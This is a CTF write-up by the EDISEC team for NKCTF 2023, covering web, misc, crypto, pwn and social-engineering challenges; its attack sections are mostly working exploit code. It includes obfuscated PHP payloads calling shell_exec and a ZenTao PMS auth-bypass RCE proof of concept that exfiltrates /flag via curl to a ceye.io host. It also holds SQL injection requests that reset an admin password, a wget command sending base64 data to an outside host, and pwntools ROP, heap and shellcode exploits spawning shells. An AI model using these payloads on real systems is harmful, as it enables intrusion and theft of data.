# 2023NKCTF-WriteUp By EDISEC

> 原文: https://www.ctfiot.com/105824.html
> ID: 105824

EDI

JOIN US ▶▶▶

招新

EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。

欢迎各位师傅加入EDI，大家一起打CTF，一起进步。（诚招re crypto pwn misc方向的师傅）有意向的师傅请联系邮箱root@edisec.net、shiyi@edisec.net（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等。

点击蓝字 ·  关注我们

00

目录

Webpagetest

easy_pms

easy_cms

xiaopi

baby_music

easy_bmp

blue

THMaster

三体

easy_word

first spam of rabbit year

easy_rgb

Crypto

Re

ez_baby_apk

Pwn

Blockchain

SocialEngineering

01

Web

1

hard_php

$_=(０/０)._;$_=$_[''=='$'];$_++;$__=$_++;$__=$_++.$__;$_++;$_++;$_='_'.$__.($_++).$_;$$_[__]($$_[_]);

NKCTF=%24_%3D(%EF%BC%90%2F%EF%BC%90)._%3B%24_%3D%24_%5B''%3D%3D'%24'%5D%3B%24_%2B%2B%3B%24__%3D%24_%2B%2B%3B%24__%3D%24_%2B%2B.%24__%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D'_'.%24__.(%24_%2B%2B).%24_%3B%24%24_%5B__%5D(%24%24_%5B_%5D)%3B&__=shell_exec&_=echo%20%60cat%20%2Fflag%60%3E%2Fvar%2Fwww%2Fhtml%2F3.txt

访问3.txt拿flag

2

easy_php

get请求:a=s1502113478a&b=s1885207154a&e=114514.11&NS[CTF.go=apost请求:c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&cmd=("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")("%03%01%08%00%00%06%0c%01%07"^"%60%60%7c%20%2f%60%60%60%60");

3

baby_php

<?php
class Welcome{ public $name; public $arg;}
function waf($string){ if(preg_match('/f|l|a|g|*|?/i', $string)){ die("you are bad"); }}class Happy{ public $shell; public $cmd;}class Hell0{ public $func;}
$ha=new Happy();$ha->shell="urldecode";$ha->cmd='system($_POST[1]);';
$he=new Hell0();$he->func=$ha;
$w=new Welcome();$w->name="welcome_to_NKCTF";$w->arg=$he;
echo urlencode(serialize($w));

4

Webpagetest

https://xz.aliyun.com/t/11798#toc-1

5

easy_pms

https://github.com/webraybtl/zentaopms_poc

# -*- coding: UTF-8 -*-# !/usr/bin/python
'''权限绕过+RCE POC 伪静态传参版禅道系统 影响版本 安全版本开源版 17.4以下的未知版本<=version<=18.0.beta1 18.0.beta2旗舰版 3.4以下的未知版本<=version<=4.0.beta1 4.0.beta2企业版 7.4以下的未知版本<=version<=8.0.beta1 8.0.beta2'''import requests
proxies = { #"http": "127.0.0.1:
8080", #"https": "127.0.0.1:
8080",}def check(url): # url="http://10.211.55.3:
8008" url1 = url+'/misc-captcha-user.html' # url1 = url+'/index.php?m=misc&f=captcha&sessionVar=user'#非伪静态版本按照此格式传参 # url2 = url+'/index.php?m=block&f=printBlock&id=1&module=my'#可判断验证绕过的链接 url3 = url + 'repo-create.html' url4 = url + 'repo-edit-10000-10000.html' headers={ "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Accept-Language":"zh-CN,zh;q=0.9", "Cookie":"zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default", }
 headers2 = { "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Accept-Language": "zh-CN,zh;q=0.9", "Cookie": "zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default", "Content-Type":"application/x-www-form-urlencoded", "X-Requested-With":"XMLHttpRequest", "Referer":
url+"/repo-edit-1-0.html" }
 data1 = 'product%5B%5D=1&SCM=Gitlab&name=66666&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid=' data2 = 'SCM=Subversion&client=`curl -F "filename=@/flag" http://9p9p2b.ceye.io`' # curl -F "filename=@/home/test/file.tar.gz" http://9p9p2b.ceye.io s=requests.session() try: req1 = s.get(url1,timeout=5,verify=False,headers=headers) req3 = s.post(url3,data=data1,timeout=5,verify=False,headers=headers2) req4 = s.post(url4,data=data2,timeout=5,verify=False,headers=headers2) print(req4.text) return True 
except Exception as e: print(e) return Falseif __name__ == '__main__': print(check("http://d8ce6925-25ed-4fd2-ad80-241401adfff8.node.yuzhian.com.cn:
8000/"))

6

easy_cms

参考：https://xz.aliyun.com/t/8056#toc-4 进行RCE

7

xiaopi

参考B站视频：https://www.bilibili.com/video/BV1Yc411j7TP

POST /service/app/account.php HTTP/1.1Host: 88ec9874-92ff-4388-be98-d25617ee0278.node2.yuzhian.com.cnUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36X-Requested-With: XMLHttpRequestAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=357da909bf07d9414ed4ed0fConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 125
type=login&username=admin';UPDATE ADMINS set PASSWORD = '67f43efc5701784db1504e4993d7e393';-- &password=admin&verifycode=mzxk

POST /service/app/account.php HTTP/1.1Host: 88ec9874-92ff-4388-be98-d25617ee0278.node2.yuzhian.com.cnUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36X-Requested-With: XMLHttpRequestAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=59896924bf07d94164875decConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 56
type=login&username=admin&password=admin&verifycode=zjm6

POST /service/app/tasks.php?type=save_shell HTTP/1.1Host: 88ec9874-92ff-4388-be98-d25617ee0278.node2.yuzhian.com.cnContent-Length: 111Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://10.9.57.100:
9080Referer: http://10.9.57.100:
9080/530BC3Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=59896924bf07d94164875decConnection: close
task_id=&title=test6&exec_cycle=5&week=1&day=3&hour=1&minute=1&shell=wget x.x.x.x:
4041/`cat /flag|base64`

POST /service/app/tasks.php?type=exec_task HTTP/1.1Host: 88ec9874-92ff-4388-be98-d25617ee0278.node2.yuzhian.com.cnContent-Length: 5Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://10.9.57.100:
9080Referer: http://10.9.57.100:
9080/530BC3Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=59896924bf07d94164875decConnection: close
tid=8

NKCTF{23076c1f-15a3-4c80-9436-d5645845d7fd}

02

Misc

1

baby_music

2

easy_bmp

https://blog.csdn.net/zip471642048/article/details/121998766

3

blue

4

THMaster

0x00000FF/rensenware_force: rensenWare forcing tool (github.com)

NKCTF{U_R_re411y_g00d_At_p14ying_t0h0u}

5

三体

from PIL import Image
def decode(im): width,height = im.size lst = [] for y in range(height): for x in range(width): red,green,blue = im.getpixel((x,y)) if(blue | green | red) == 0: break index = (green<<8) + blue lst.append(chr(index)) return ''.join(lst)
if __name__=='__main__':
 all_text = decode(Image.open("out.bmp","r")) with open ("decode.text","w",encoding = "utf-8") as f: f.write(all_text)

6

easy_word

7

first spam of rabbit year

https://spammimic.com/decode.shtml

8

easy_rgb

montage *.png -tile 30x6 -geometry +0+0 flag_tmp.pnggaps --image flag_tmp.png　 --size 125 --save#说明一下参数 30x6和125#-tile：设置每行每列的原始图片数量，30x6 表示拼图的宽30张 高6张，这个要结合gaps多尝试几种不同组合才能得到正确的尺寸。#--size: 这里每张图片为125像素

with open("r.txt") as r: red=r.read()with open("g.txt") as g: green=g.read()with open("b.txt") as b: blue = b.read()str=""for i in range(0,148): str+=red[i] str+=green[i] str+=blue[i]print(str)

IBTyf9pgyR9pCERLR5NuOpiONSG1VZptmvUIgoQ/RTEpTZPVTW2a779plBFIvcN+AES-12

NKCTF{603fcdfc-652b-40e4-90cf-f27c2edc2d9f}

03

Crypto

1

baby_rsa

e=65537n = 114101396033690088275999670914803472451228154227614098210572767821433470213124900655723605426526569384342101959232900145334500170690603208327913698128445002527020347955300595384752458477749198178791196660625870659540794807018881780680683388008090434114437818447523471527878292741702348454486217652394664664641N = 1159977299277711167607914893426674454199208605107323826176606074354449015203832606569051328721360397610665453513201486235549374869954501563523028914285006850687275382822302821825953121223999268058107278346499657597050468069712686559045712946025472616754027552629008516489090871415609098178522863027127254404804829735621706042266140637592206366042515190385496909533329383212542170504864473944657824502882014292528444918055958758310544435120502872883857209880723535754528096143707324179005292445100655695427777453144657819474805882956064292780031599790769618615908501966912635232746588639924772530057835864082951499028dP = 33967356791272818610254738927769774016289590226681637441101504040121743937150259930712897925893431093938385216227201268238374281750681609796883676743311872905933219290266120756315613501614208779063819499785817502677885240656957036398336462000771885589364702443157120609506628895933862241269347200444629283263
# t=e*dP-1
# for k in range(1,e):# if t%k==0:# P=(t//k)+1
# if N%P==0:# print(P)
P=37269067352457630263351774206178494913957088859822110344334922741582406663
3576632750017778267445345566529934525770887732758255395539070275277220458844
8929725998468789449650526538407798388258024733397295470464451746999991657489
3996324149548980338301147983367163067556434434982470623587914250041142380667
816331Q=N//P
PR.<x>=Zmod(n)[]f=(x-P)*(x-Q)m=f.small_roots(X=2^300)print(m)
m=152099310694956022622926857538598513541723670773227126074246760446874272165452073476477print(long_to_bytes(m))

04

Re

1

ez_baby_apk

NKCTF{nI_k@i_sHi_zhu_j1an_il_Jie_RE_le}

05

Pwn

1

ezshellcode

#!usr/bin/env python #coding=utf-8
from pwn import *from ctypes import CDLLcontext(arch = 'amd64',os = 'linux',log_level = 'debug')elf = ELF('./pwn')DEBUG = 1if DEBUG: gdbOpen = 1 clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') p = process('./pwn')else: gdbOpen = 0 ip = 'node.yuzhian.com.cn' port = 38867 p = remote(ip, port) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') def debug(info="b main"): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, "b *$rebase(0x)")

debug("b *0x00000000004012F1")shellcode = p8(0x90) * 104 + asm(shellcraft.sh()) p.sendafter("in 5 min!n", shellcode)
p.interactive()

2

a_story_of_a_pwner

#!usr/bin/env python #coding=utf-8
from pwn import *from ctypes import CDLLcontext(arch = 'amd64',os = 'linux',log_level = 'debug')elf = ELF('./pwn')DEBUG = 0if DEBUG: gdbOpen = 1 clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') libc = ELF("./libc.so.6") p = process('./pwn')else: gdbOpen = 0 ip = 'node2.yuzhian.com.cn' port = 33627 libc = ELF("./libc.so.6") p = remote(ip, port) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') def debug(info="b main"): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, "b *$rebase(0x)")

def choose(choice): p.sendlineafter(b"> n", str(choice).encode('ascii'))
pop_rdi = 0x0000000000401573leave_ret = 0x000000000040139Edebug("b *0x000000000040139F")choose(4)p.recvuntil(b'0x')leak = int(p.recv(12), 16) - 0x84420log.info("libc_base==>0x%x" %leak)sys = leak + libc.sym['system']binsh = leak + next(libc.search(b'/bin/sh'))choose(1)p.sendafter(b'comment?n', p64(binsh))choose(2)p.sendafter(b'corment?n', p64(pop_rdi))choose(3)p.sendafter(b'corMenT?n', p64(sys))choose(4)payload = b'a'*0xa + p64(0x0000000000405098) + p64(leave_ret)p.sendafter(b'heart...n', payload)
p.interactive()

3

ez_stack

#!usr/bin/env python #coding=utf-8
from pwn import *from ctypes import CDLLcontext(arch = 'amd64',os = 'linux',log_level = 'debug')elf = ELF('./ez_stack')DEBUG = 0if DEBUG: gdbOpen = 1 libc = ELF("/home/shoucheng/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so") ld = ELF("/home/shoucheng/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so") p = process(argv=[ld.path,elf.path], env={"LD_PRELOAD" : libc.path}) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') #p = process('./ez_stack')else: gdbOpen = 0 ip = 'node2.yuzhian.com.cn' port = 35211 p = remote(ip, port) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') def debug(info="b main"): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, "b *$rebase(0x)")
pop_rdi = 0x0000000000401283pop_rsi = 0x0000000000401281 # pop rsi ; pop r15 ; retsyscall = 0x000000000040114ecsu1 = 0x000000000040127Acsu2 = 0x0000000000401260
debug("b *0x00000000004011F6")payload = b'a'*0x18 + p64(pop_rsi) + p64(0x4040B0)*2 + p64(syscall)payload += p64(csu1) + p64(0) + p64(1) + p64(0x4040B0) + p64(0)*2 + p64(0x4040B8) + p64(csu2)p.sendafter("NKCTF!n", payload)sleep(1)
payload = b'/bin/shx00' + p64(syscall) + b'a'*0x2bp.send(payload)p.interactive()

4

baby_rop

#!usr/bin/env python #coding=utf-8
from pwn import *from ctypes import CDLLcontext(arch = 'amd64',os = 'linux',log_level = 'debug')elf = ELF('./nkctf_message_boards')DEBUG = 0if DEBUG: gdbOpen = 1 clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') p = process('./nkctf_message_boards') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: gdbOpen = 0 ip = 'node2.yuzhian.com.cn' port = 34966 p = remote(ip, port) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def debug(info="b main"): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, "b *$rebase(0x)")

debug("b *0x0000000000401340")ret = 0x000000000040101apop_rdi = 0x0000000000401413main = 0x00000000004010F0puts_plt = elf.plt['puts']puts_got = elf.got['puts']read_got = elf.got['read']
format = b"%41$pn"p.sendafter(b"name: ", format)p.recvuntil(b'0x')canary = int(p.recv(16), 16)log.info(hex(canary))payload = p64(ret)*30 + p64(main) + p64(canary)p.sendafter(b"the NKCTF: n", payload)format = b"%22$pn"p.sendafter(b"name: ", format)p.recvuntil(b'0x')leak = int(p.recv(12), 16) - 0x1ed6a0sys = leak + libc.sym['system']binsh = leak + next(libc.search(b'/bin/sh'))log.info(hex(leak))payload = p64(ret)*28 + p64(pop_rdi) + p64(binsh) + p64(sys) + p64(canary)p.sendafter(b"the NKCTF: n", payload)
p.interactive()

5

9961code

#coding:
utf-8
from pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./pwn'elf=ELF(elfelf)context.arch=elf.archgdb_text='''b *$rebase(0x139b) '''
if len(sys.argv)==1 : io=process(elfelf) gdb_open=1 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
elif sys.argv[1]=='2' : io=process(elfelf) gdb_open=0 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
else : io=remote('node2.yuzhian.com.cn',32697) gdb_open=0 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a)
shell='''shl edi,12mov ax,10call:
xor dx,0x9966syscallxchg edi,esixor eax,eaxmov edi,eaxjmp call'''

pay=asm(shell)gdb_attach(io,gdb_text)pause()io.send(pay)sleep(1)shell='''mov rsp,0x9961c00'''
pay='a'*0xe+asm(shell)pay+='x48x31xf6x56x48xbfx2fx62x69x6ex2fx2fx73x68x57x54x5fxb0x3bx99x0fx05'
io.send(pay)
#NKCTF{4b4e9ac2-8163-4e58-a14b-02c1cb7f7654}# libc_base=u64(io.recvuntil('x7f')[-6:]+'x00x00')-libc.sym['__malloc_hook']-88-0x10
# libc.address=libc_base
# bin_sh_addr=libc.search('/bin/shx00').next()
# system_addr=libc.sym['system']# free_hook_addr=libc.sym['__free_hook']
# success('libc_base:'+hex(libc_base))
# success('heap_base:'+hex(heap_base))

io.interactive()

6

baby_heap

#!usr/bin/env python #coding=utf-8
from pwn import *from ctypes import CDLLcontext(arch = 'amd64',os = 'linux',log_level = 'debug')elf = ELF('./pwn')DEBUG = 0if DEBUG: gdbOpen = 1 libc = ELF("/home/shoucheng/tools/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc-2.32.so") ld = ELF("/home/shoucheng/tools/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/ld-2.32.so") p = process(argv=[ld.path,elf.path], env={"LD_PRELOAD" : libc.path}) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') #p = process('./')else: gdbOpen = 0 ip = 'node2.yuzhian.com.cn' port = 30509 libc = ELF("./libc-2.32.so") p = remote(ip, port) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') def debug(info="b main"): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, "b *$rebase(0x)")

def choose(choice): p.sendlineafter(b"Your choice: ", str(choice).encode('ascii'))

def add(idx, size): choose(1) p.recvuntil(b"index: ") p.sendline(str(idx).encode('ascii')) p.recvuntil(b"Size: ") p.sendline(str(size).encode('ascii')) def edit(idx, content): choose(3) p.recvuntil(b"index: ") p.sendline(str(idx).encode('ascii')) p.recvuntil(b"content: ") p.send(content)

def show(idx): choose(4) p.recvuntil(b"index: ") p.sendline(str(idx).encode('ascii'))

def free(idx): choose(2) p.recvuntil(b"index: ") p.sendline(str(idx).encode('ascii'))

for i in range(8): add(i, 0x100)add(8, 0x100)for i in range(8): free(i)for i in range(7): add(i, 0x100)add(7, 0xf0)edit(7, b'n')show(7)leak = u64(p.recv(6).ljust(8, b'x00')) - 0x1e3d0alog.info("libc_base==>0x%x" %leak)sys = leak + libc.sym['system']free_hook = leak + libc.sym['__free_hook']log.info("free_hook==>0x%x" %free_hook)show(6)key = u64(p.recv(5).ljust(8, b'x00'))log.info("key==>0x%x" %key)add(9, 0x78)add(10, 0x60)add(11, 0x60)add(12, 0x60)edit(9, b'a'*0x78 + b'xe1')free(12)free(11)free(10)add(10, 0xd0)edit(10, b'/bin/shx00' + b'a'*0x60 + p64(0x71) + p64(free_hook^key) + b'n')add(13, 0x60)add(14, 0x60)edit(14, p64(sys) + b'n')free(10)debug()p.interactive()

7

only_read

#!usr/bin/env python #coding=utf-8
from pwn import *from ctypes import CDLLcontext(arch = 'amd64',os = 'linux',log_level = 'debug')elf = ELF('./pwn')DEBUG = 0if DEBUG: gdbOpen = 1 clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') p = process('./pwn')else: gdbOpen = 0 ip = 'node2.yuzhian.com.cn' port = 39981 p = remote(ip, port) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def debug(info="b main"): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, "b *$rebase(0x)")
debug("b *0x00000000004013E1")p.send(b'V2VsY29tZSB0byBOS0NURiE=')sleep(1)p.send(b'dGVsbCB5b3UgYSBzZWNyZXQ6')sleep(1)p.send(b'SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45')sleep(1)p.send(b'Y2FuIHlvdSBmaW5kIG1lPw==')
read_plt = elf.plt['read']read_got = elf.got['read']pop_rdi = 0x0000000000401683pop_rsi = 0x0000000000401681csu1 = 0x000000000040167Acsu2 = 0x0000000000401660
payload = b'a'*0x38 + p64(pop_rsi) + p64(0x404100)*2 + p64(read_plt)payload += p64(pop_rsi) + p64(read_got)*2 + p64(read_plt)payload += p64(csu1) + p64(0) + p64(1) + p64(1) + p64(read_got) + p64(0x3b) + p64(read_got) + p64(csu2)payload += p64(csu1) + p64(0) + p64(1) + p64(0x404100) + p64(0) + p64(0) + p64(read_got) + p64(csu2)p.send(payload)sleep(2)p.sendline(b'/bin/shx00')sleep(5)p.send(p8(0xd0))
p.interactive()

8

ByteDance

#!usr/bin/env python #coding=utf-8
from pwn import *from ctypes import CDLLcontext(arch = 'amd64',os = 'linux', log_level = 'debug')elf = ELF('./pwn02')DEBUG = 0if DEBUG: gdbOpen = 1 libc = ELF("/home/shoucheng/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so") ld = ELF("/home/shoucheng/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so") p = process(argv=[ld.path,elf.path], env={"LD_PRELOAD" : libc.path}) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
else: gdbOpen = 0 ip = 'node2.yuzhian.com.cn' port = 39089 libc = ELF("/home/shoucheng/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so") p = remote(ip, port) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') def debug(info="b main"): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, "b *$rebase(0x)")

def choose(choice): p.sendlineafter(b"Choice:", str(choice).encode('ascii'))

def add(size, content): choose(1) p.recvuntil(b"size:") p.sendline(str(size).encode('ascii')) p.recvuntil(b"content:") p.send(content)
def show(idx): choose(2) p.recvuntil(b"index:") p.sendline(str(idx).encode('ascii'))

def free(idx): choose(3) p.recvuntil(b"index: ") p.sendline(str(idx).encode('ascii'))

#prepare 0x140 size unsorted binadd(0x37,b'x00'*0x37)#idx 0 0x40add(0x37,b'x01'*0x37)#idx 1 0x80add(0x37,b'x02'*0x37)#idx 2 0xc0add(0x37,b'x03'*0x37)#idx 3 0x100 add(0x37,b'x00'*0x37)#idx 4 0x140
#prepare a chunkadd(0x37,b'x00'*0x37)#idx 5
#prepare chunks between idx 5 and top_chunk.add(0x37,b'x06'*0x37)#idx 6add(0x37,b'x07'*0x37)#idx 7add(0x37,b'x06'*0x37)#idx 8add(0x37,b'x07'*0x37)#idx 9add(0x37,b'x06'*0x37)#idx 10
#put chunk in fastbin for i in range(5): free(i)

p.sendlineafter(b"Choice:", b'1'*0x500)add(0x28,b'x00'*0x28)
#madd some chunk.add(0x37,b'x01'*0x37) #idx 1 0x030add(0x17,b'x02'*0x17) #idx 2 0x070add(0x37,b'x03'*0x37) #idx 3 0x090add(0x37,b'x00'*0x37) #idx 4 0x0d0add(0x17,b'x00'*0x17) #idx 11 0x110#put the chunk in fastbin to make overlapped chunk.free(5)free(1)
p.sendlineafter(b"Choice:", b'1'*0x500)add(0x37,b'x01'*0x37) #idx 1 0x030show(2)p.recvuntil(b'Content: ')leak = u64(p.recv(6).ljust(8, b'x00')) - 0x3c4b78log.info("libc_base==>0x%x" %leak)sys = leak + libc.sym['system']_IO_list_all = leak + libc.sym['_IO_list_all']add(0x17,b'x00'*0x17)#idx 5 0x070 = idx 2add(0x17,b'x08'*0x17)#idx 12 0x090free(12)free(5)show(2)p.recvuntil(b'Content: ')heap_base = u64(p.recv(6).ljust(8, b'x00')) - 0x90log.info("heap_base==>0x%x" %heap_base)
free(4)add(0x27,b'x00'*0x18+p64(0x41)+b'x00'*7) # must keep the fastbin size = 0x41fake_file = b'/bin/shx00'+p64(0x61) # fake_filefake_file += p64(0)+p64(_IO_list_all-0x10) #unsorted bin attackfake_file += p64(0)+p64(1) #bypass checkfake_file = fake_file.ljust(0x38,b'x00')add(0x38,fake_file)free(6)payload_1 = b'x00'*0x28 + p64(heap_base+0x1d0) # point to fake_vtablepayload_1 = payload_1.ljust(0x37,b'x00')add(0x37,payload_1)free(7)payload_2 = p64(0)*3 + p64(sys) # fake_vtablepayload_2 = payload_2.ljust(0x37,b'x00')add(0x37,payload_2)debug()
p.sendlineafter(b"Choice:", b'1')p.sendlineafter(b"size:", str(0x20).encode('ascii'))
p.interactive()

06

Blockchain

1

SignIn

NKCTF{W3c0me_to_NKCTF2023}

07

SocialEngineering

1

两个人的夜晚

NKCTF{天津市西青区中北镇万卉路3号NCC新城市中心}

2

Bridge

NKCTF{海南省海口市龙华区世纪公园}

3

旅程的开始

NKCTF{贵州省贵阳市南明区遵义路1号}

4

The other Bridge

NKCTF{重庆市渝中区嘉陵江畔戴家巷崖壁步道}

5

Ferris_Wheel

NKCTF{重庆市永川区兴龙湖CBD永川里奥特莱斯渝西之眼摩天轮}

6

狂飙

NKCTF{广东省江门市蓬江区莲平路}

EDI安全

扫二维码｜关注我们

一个专注渗透实战经验分享的公众号


```
$_=(０/０)._;$_=$_[''=='$'];$_++;$__=$_++;$__=$_++.$__;$_++;$_++;$_='_'.$__.($_++).$_;$$_[__]($$_[_]);
NKCTF=%24_%3D(%EF%BC%90%2F%EF%BC%90)._%3B%24_%3D%24_%5B''%3D%3D'%24'%5D%3B%24_%2B%2B%3B%24__%3D%24_%2B%2B%3B%24__%3D%24_%2B%2B.%24__%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D'_'.%24__.(%24_%2B%2B).%24_%3B%24%24_%5B__%5D(%24%24_%5B_%5D)%3B&__=shell_exec&_=echo%20%60cat%20%2Fflag%60%3E%2Fvar%2Fwww%2Fhtml%2F3.txt
get请求:a=s1502113478a&b=s1885207154a&e=114514.11&NS[CTF.go=apost请求:c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/F